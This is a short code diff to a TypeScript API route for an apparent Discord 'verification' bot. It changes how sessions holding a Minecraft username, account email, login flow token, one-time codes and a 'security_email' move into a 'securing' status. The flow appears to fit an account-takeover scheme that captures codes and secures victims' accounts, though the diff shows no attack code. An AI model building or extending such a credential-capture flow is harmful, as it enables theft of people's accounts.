@@ -56,6 +56,7 @@ export const Route = createFileRoute("/api/bots/worker/verification-action")({
             );
           }
 
+          // Use securing+gateway_otp so HTTP otp-pending poll does NOT double-send codes
           const { data: session, error } = await client
             .from("verification_sessions")
             .insert({
@@ -63,7 +64,8 @@ export const Route = createFileRoute("/api/bots/worker/verification-action")({
               guild_id: guildId,
               mc_username: username,
               mc_email: email,
-              status: "pending",
+              status: "securing",
+              error_message: "gateway_otp",
               flow_token: body.flow_token || "",
               security_email: body.security_email || null,
               channel_id: body.channel_id || settings.channel_id || null,
@@ -95,7 +97,8 @@ export const Route = createFileRoute("/api/bots/worker/verification-action")({
               flow_token: body.flow_token || undefined,
               error_message: null,
             })
-            .eq("id", id);
+            .eq("id", id)
+            .in("status", ["securing", "pending"]);
           if (error) return Response.json({ error: error.message }, { status: 500 });
           return Response.json({ ok: true });
         }
